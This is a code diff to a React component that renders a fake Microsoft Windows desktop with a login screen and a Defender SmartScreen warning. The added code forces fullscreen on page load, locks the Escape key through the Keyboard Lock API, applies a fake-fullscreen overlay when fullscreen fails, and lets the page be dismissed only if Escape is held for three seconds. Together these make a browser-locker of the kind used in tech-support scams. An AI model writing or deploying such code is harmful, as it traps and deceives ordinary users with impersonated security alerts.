@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import '../../assets/css/microsoft.css';
 import { FaBell, FaCog, FaQuestionCircle } from 'react-icons/fa';
 import SecondContainer from "../../assets/components/second-container";
@@ -6,6 +6,94 @@ import ThirdContainer from "../../assets/components/third-container";
 
 function Microsoft() {
     const [showLogin, setShowLogin] = useState(true);
+    const [escHoldStart, setEscHoldStart] = useState<number | null>(null);
+    const HOLD_DURATION = 3000;
+
+    const requestKeyboardLock = async () => {
+        if ('keyboard' in navigator) {
+            try {
+                await (navigator as any).keyboard.lock(['Escape']);
+            } catch (err) {}
+        }
+    };
+
+    const unlockKeyboard = () => {
+        if ('keyboard' in navigator) {
+            (navigator as any).keyboard.unlock();
+        }
+    };
+
+    useEffect(() => {
+        let isMounted = true;
+
+        const enterFullScreen = async () => {
+            const elem = document.documentElement;
+            try {
+                await elem.requestFullscreen();
+                if (isMounted) await requestKeyboardLock();
+            } catch (err) {
+                // Fake fullscreen fallback
+                Object.assign(document.documentElement.style, {
+                    position: 'fixed',
+                    inset: '0',
+                    width: '100vw',
+                    height: '100vh',
+                    overflow: 'hidden',
+                    zIndex: '9999',
+                });
+            }
+        };
+
+        enterFullScreen();
+
+        const handleFullscreenChange = () => {
+            if (!document.fullscreenElement) {
+                unlockKeyboard();
+            } else if (isMounted) {
+                requestKeyboardLock();
+            }
+        };
+
+        document.addEventListener('fullscreenchange', handleFullscreenChange);
+
+        return () => {
+            isMounted = false;
+            unlockKeyboard();
+            document.removeEventListener('fullscreenchange', handleFullscreenChange);
+            if (document.fullscreenElement) {
+                document.exitFullscreen().catch(() => {});
+            }
+        };
+    }, []);
+
+    useEffect(() => {
+        const handleKeyDown = (e: KeyboardEvent) => {
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                if (escHoldStart === null) {
+                    setEscHoldStart(Date.now());
+                }
+            }
+        };
+
+        const handleKeyUp = (e: KeyboardEvent) => {
+            if (e.key === 'Escape' && escHoldStart !== null) {
+                const held = Date.now() - escHoldStart;
+                if (held >= HOLD_DURATION) {
+                    setShowLogin(false);
+                }
+                setEscHoldStart(null);
+            }
+        };
+
+        window.addEventListener('keydown', handleKeyDown, { capture: true });
+        window.addEventListener('keyup', handleKeyUp, { capture: true });
+
+        return () => {
+            window.removeEventListener('keydown', handleKeyDown, { capture: true });
+            window.removeEventListener('keyup', handleKeyUp, { capture: true });
+        };
+    }, [escHoldStart]);
 
     return (
         <div className="fake-desktop">
@@ -30,7 +118,6 @@ function Microsoft() {
                             <FaQuestionCircle />
                         </button>
                     </div>
-
                 </div>
 
                 <div className="sidebar-content">
@@ -40,7 +127,6 @@ function Microsoft() {
 
             <SecondContainer />
             <ThirdContainer />
-
 
             <footer className="page-footer">
                 <div className="footer-top">
@@ -52,10 +138,10 @@ function Microsoft() {
                 <div className="footer-marquee">
                     <div className="marquee-content">
                         <span>
-                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you. &nbsp;&nbsp;
+                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you.  &nbsp;
                         </span>
                         <span>
-                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you. &nbsp;&nbsp;
+                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you.  &nbsp;
                         </span>
                     </div>
                 </div>
